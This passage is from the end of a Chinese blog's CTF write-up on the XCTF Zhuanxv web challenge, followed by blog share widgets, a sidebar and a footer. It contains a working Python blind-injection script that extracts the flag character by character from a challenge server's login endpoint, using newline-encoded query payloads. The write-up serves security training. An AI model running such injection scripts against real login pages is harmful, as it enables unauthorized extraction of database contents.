+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.session()</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    p=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">          payload=<span class="string">&quot;(select%0Aascii(substr(id,&quot;</span>+str(i)+<span class="string">&quot;,1))%0Afrom%0AFlag%0Awhere%0Aid&lt;2)&lt;&#x27;&quot;</span>+str(j)+<span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">          url=<span class="string">&quot;http://111.198.29.45:35732/zhuanxvlogin?user.name=admin&#x27;%0Aor%0A&quot;</span>+payload+<span class="string">&quot;%0Aor%0Aname%0Alike%0A&#x27;admin&amp;user.password=1&quot;</span></span><br><span class="line">          r1=s.get(url)</span><br><span class="line">          <span class="keyword">if</span> len(r1.text)&gt;<span class="number">20000</span> <span class="keyword">and</span> p!=<span class="string">&#x27;&#x27;</span>:</span><br><span class="line">              flag+=p</span><br><span class="line">              <span class="keyword">print</span> i,flag</span><br><span class="line">              <span class="keyword">break</span></span><br><span class="line">          p=chr(j)</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20200813140823340.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+
+            </div>
+            
+                <div class="kratos-copyright text-center clearfix">
+                    <h5>本作品采用 <a rel="license nofollow" target="_blank" href="http://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
+                </div>
+            
+            <footer class="kratos-entry-footer clearfix">
+                
+                    <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                    
+                        <a class="donate" href="javascript:;"><i class="fa fa-bitcoin"></i> 打赏</a>
+                    
+                    
+                        <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
+                        <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "http://wumingzhilian.github.to/2020/08/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BAZhuanxv%E8%AF%A6%E8%A7%A3/",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "http://wumingzhilian.github.to/2020/08/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BAZhuanxv%E8%AF%A6%E8%A7%A3/";
+            const title         = "「攻防世界web进阶区Zhuanxv详解」";
+            const excerpt       = `题目提示:
+详解扫描目录发现了一个list我们使用了好几个扫描工具，只有wwwscan，和webdirscan可以，（可能是我字典太菜了）
+发现需要登录查看源代码发现，这里有问题，加载图片的方式很诡异试试文件读取他的cookie里有j...`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                    
+                    </div>
+                
+                <div class="footer-tag clearfix">
+                    <div class="pull-left">
+                    <i class="fa fa-tags"></i>
+                        <a class="tag-none-link" href="/tags/web%E8%BF%9B%E9%98%B6%E5%8C%BA/" rel="tag">web进阶区</a>, <a class="tag-none-link" href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" rel="tag">攻防世界</a>
+                    </div>
+                    <div class="pull-date">
+                    <span>最后编辑：2020-08-13</span>
+                    </div>
+                </div>
+            </footer>
+        </div>
+        
+            <nav class="navigation post-navigation clearfix" role="navigation">
+                
+                <div class="nav-previous clearfix">
+                    <a title=" 渗透测试基础笔记" href="/2020/08/12/渗透测试基础笔记/">&lt; 上一篇</a>
+                </div>
+                
+                
+            </nav>
+        
+        
+            <div id="disqus_thread"></div>
+<script>
+    $(function(){
+        window.DISQUS = null;
+        new DisqusJS({
+            shortname: '',
+            siteName: '',
+            identifier: '2020/08/13/攻防世界web进阶区Zhuanxv详解/',
+            url: 'http://wumingzhilian.github.to/2020/08/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BAZhuanxv%E8%AF%A6%E8%A7%A3/',
+            api: '',
+            apikey: '',
+            admin: '',
+            adminLabel: ''
+        });
+    });
+</script>
+<noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://github.com/SukkaW/DisqusJS">comments powered by DisqusJS.</a></noscript>
+        
+    </article>
+</section>
+</div>
+        
+            <section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+                
+                    <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/avatar.png" />
+        </div>
+    </div>
+    <div class="textwidget">
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.</span> <span class="toc-text">题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E7%A4%BA"><span class="toc-number">1.1.</span> <span class="toc-text">提示:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.2.</span> <span class="toc-text">详解</span></a></li></ol></li></ol>
+        
+    </div>
+</aside>
+                
+                    <!-- Moved to about.ejs -->
+                
+                    
+  <aside id="krw-categories" class="widget widget-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">12</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/XSS-Labs/">XSS-Labs</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><span class="category-list-count">2</span></li></ul>
+  </aside>
+
+
+                
+                    
+  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
+    <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
+      <div class="tag-clouds">
+        <a href="/tags/CTF/" style="font-size: 0.67em;">CTF</a> <a href="/tags/WEB/" style="font-size: 0.6em;">WEB</a> <a href="/tags/XSS-Labs/" style="font-size: 0.6em;">XSS-Labs</a> <a href="/tags/web%E8%BF%9B%E9%98%B6%E5%8C%BA/" style="font-size: 0.73em;">web进阶区</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" style="font-size: 0.6em;">信息搜集</a> <a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.8em;">攻防世界</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 0.6em;">渗透测试</a>
+      </div>
+  </aside>
+
+                
+                    
+  <aside id="krw-posts" class="widget widget-kratos-poststab">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+          <a class="list-group-item" href="/2020/08/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BAZhuanxv%E8%AF%A6%E8%A7%A3/"><i class="fa  fa-book"></i> 攻防世界web进阶区Zhuanxv详解</a>
+        
+          <a class="list-group-item" href="/2020/08/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/"><i class="fa  fa-book"></i> 渗透测试基础笔记</a>
+        
+          <a class="list-group-item" href="/2020/08/12/web%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/"><i class="fa  fa-book"></i> web信息收集之搜索引擎</a>
+        
+          <a class="list-group-item" href="/2020/08/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BAcomment%E8%AF%A6%E8%A7%A3/"><i class="fa  fa-book"></i> 攻防世界web进阶区comment详解</a>
+        
+          <a class="list-group-item" href="/2020/08/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BAWeb-php-wrong-nginx-config%E8%AF%A6%E8%A7%A3/"><i class="fa  fa-book"></i> 攻防世界web进阶区Web_php_wrong_nginx_config详解</a>
+        
+      </ul>
+  </div>
+  </aside>
+
+                
+            </section>
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer">
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://t.me/wumingzhilian"><i class="fa fa-telegram"></i></a></li>
+                        <li><a target="_blank" rel="nofollow" href="https://twitter.com/wumingzhilian"><i class="fa fa-twitter"></i></a></li>
+                        
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://github.com/wumingzhilian"><i class="fa fa-github"></i></a></li>
+                        <li><a target="_blank" rel="nofollow" href="/atom.xml"><i class="fa fa-rss"></i></a></li>
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2020 wuming 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
+                            <li>Made with <i class="fa fa-heart throb" style="color:#d43f57"></i> by <a href="https://candinya.com" target="_blank" rel="nofollow">Candinya</a>.</li>
+                        </div>
+                        <div>
+                            <li>Hosted by <a href="https://github.io" target="_blank">Github Pages</a></li>
+                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
+                        </div>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+<script defer src="https://cdn.jsdelivr.net/npm/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.js"></script>
+<script>const notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));</script>
+
+<script async src="/js/candy.min.js"></script>
+
+    <script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+    <div id="aplayer"></div>
+<script>
+$.ajax({
+    type:"get",
+    url:"",
+    dataType:"json",
+    success: function(data){
+        new APlayer({
+            container: document.getElementById('aplayer'),
+            fixed: true,
+            order: 'random',
+            lrcType: 3,
+            audio: data
+        });
+    }
+});
+</script>
+
+
+    <script defer src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+    <script defer src="/js/kr-dark.min.js"></script>
+
+
+
+</body>
+</html>
